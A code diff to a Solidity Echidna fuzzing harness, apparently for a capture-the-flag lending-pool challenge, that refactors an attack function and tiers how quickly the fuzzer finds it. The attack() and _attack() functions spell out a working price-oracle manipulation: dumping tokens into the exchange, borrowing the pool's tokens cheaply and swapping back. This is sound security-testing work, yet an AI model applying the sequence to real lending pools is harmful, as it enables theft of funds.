@@ -15,10 +15,18 @@ import "./Deployer.sol";
 contract Echidna {
     using Address for address payable;
 
+    // Determines how fast Echidna can find the solution
     enum TestingLevel {
-        EducatedGuess,
-        SuspectFunctions,
-        Naive
+        // < 200 calls: 1 sec
+        Solved,
+        // < 30000 calls : 20 sec
+        UnsolvedAddresses,
+        // < 600000 calls : 5 min
+        UnsolvedTokenValues,
+        // < 900000 iterations: 10 min (couldn't find in 10min)
+        UnorderedFunctions,
+        // > 10000000 iterations: can't find solution
+        NoHarness
     }
 
     Deployer _deployer;
@@ -32,7 +40,7 @@ contract Echidna {
 
     uint256 _initialPoolTokenBalance;
 
-    TestingLevel private _testingLevel = TestingLevel.SuspectFunctions;
+    TestingLevel private _testingLevel = TestingLevel.UnorderedFunctions;
 
     error OnlyTestingLevel(TestingLevel supported);
 
@@ -67,31 +75,99 @@ contract Echidna {
     // EDUCATED GUESS
     // //////////////
 
-    function attack() external onlyTestingLevel(TestingLevel.EducatedGuess) {
-        _token.approve(address(_exchange), ATTACKER_TOKENS);
-        _exchange.tokenToEthSwapInput(
+    function attack() public onlyTestingLevel(TestingLevel.Solved) {
+        _attack(
+            address(this),
+            address(_exchange),
             ATTACKER_TOKENS,
-            // @audit-info min-eth needs to be > 0
-            1, // min eth
+            block.timestamp + 1 hours,
+            _initialPoolTokenBalance,
             block.timestamp + 1 hours
         );
-        _pool.borrow{value: address(this).balance}(
-            _initialPoolTokenBalance,
-            address(this)
+    }
+
+    // ////////////
+    // Unfunctional
+    // ////////////
+
+    function attackWithAddresses(
+        address attacker,
+        address exchange
+    ) external onlyTestingLevel(TestingLevel.UnsolvedAddresses) {
+        _unfunctionalAttack(attacker, exchange);
+    }
+
+    function attackWithTokenValues(
+        uint256 tokenToEthAmount,
+        uint256 poolBorrowAmount
+    ) external onlyTestingLevel(TestingLevel.UnsolvedTokenValues) {
+        _attack(
+            address(this),
+            address(_exchange),
+            tokenToEthAmount,
+            block.timestamp + 1 hours,
+            poolBorrowAmount,
+            block.timestamp + 1 hours
         );
-        _exchange.ethToTokenSwapInput{value: address(this).balance}(
-            1, // min token
+    }
+
+    function _unfunctionalAttack(address attacker, address exchange) internal {
+        _attack(
+            attacker,
+            exchange,
+            ATTACKER_TOKENS,
+            block.timestamp + 1 hours,
+            _initialPoolTokenBalance,
             block.timestamp + 1 hours
         );
     }
 
     // /////////////////
-    // SUSPECT FUNCTIONS
+    // PRIVATE FUNCTIONS
     // /////////////////
+
+    function _attack(
+        address attacker,
+        address exchange,
+        uint256 tokenToEthAmount,
+        uint256 tokenToEthDeadline,
+        uint256 poolBorrowAmount,
+        uint256 ethToTokenDeadline
+    ) internal {
+        _token.approve(exchange, tokenToEthAmount);
+        _exchange.tokenToEthSwapInput(
+            tokenToEthAmount,
+            // @audit-info min-eth needs to be > 0
+            1, // min eth
+            tokenToEthDeadline
+        );
+
+        uint256 poolBorrowValue = attacker.balance;
+        _pool.borrow{value: poolBorrowValue}(poolBorrowAmount, attacker);
+
+        uint256 ethToTokenValue = attacker.balance;
+        _exchange.ethToTokenSwapInput{value: ethToTokenValue}(
+            1, // min token
+            ethToTokenDeadline
+        );
+    }
+
+    // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
+    function disabled_echidna_test_attack_doesnt_revert()
+        internal
+        returns (bool)
+    {
+        attack();
+        return true;
+    }
+
+    // ///////////////////
+    // UNORDERED FUNCTIONS
+    // ///////////////////
 
     function approve(
         uint256 amount
-    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
         _token.approve(address(_exchange), amount);
     }
 
@@ -99,21 +175,23 @@ contract Echidna {
         uint256 tokens_sold,
         uint256 min_eth,
         uint256 deadline
-    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
         _exchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
     }
 
     function borrow(
         uint256 amount
-    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
-        _pool.borrow{value: address(this).balance}(amount, address(this));
+    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
+        uint256 poolBorrowValue = address(this).balance;
+        _pool.borrow{value: poolBorrowValue}(amount, address(this));
     }
 
     function ethToTokenSwapInput(
         uint256 min_tokens,
         uint256 deadline
-    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
-        _exchange.ethToTokenSwapInput{value: address(this).balance}(
+    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
+        uint256 ethToTokenValue = address(this).balance;
+        _exchange.ethToTokenSwapInput{value: ethToTokenValue}(
             min_tokens,
             deadline
         );
@@ -122,29 +200,6 @@ contract Echidna {
     // ////////////////////
     // INVARIANT PROPERTIES
     // ////////////////////
-
-    // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
-    function echidna_test_attack_doesnt_revert() external returns (bool) {
-        revert("Disabled");
-
-        _token.approve(address(_exchange), ATTACKER_TOKENS);
-        _exchange.tokenToEthSwapInput(
-            ATTACKER_TOKENS,
-            // @audit-info min-eth needs to be > 0
-            1, // min eth
-            block.timestamp + 1 hours
-        );
-        _pool.borrow{value: address(this).balance}(
-            _initialPoolTokenBalance,
-            address(this)
-        );
-        _exchange.ethToTokenSwapInput{value: address(this).balance}(
-            1, // min token
-            block.timestamp + 1 hours
-        );
-        return true;
-    }
-
     function echidna_cannot_empty_tokens_from_pool()
         public
         view
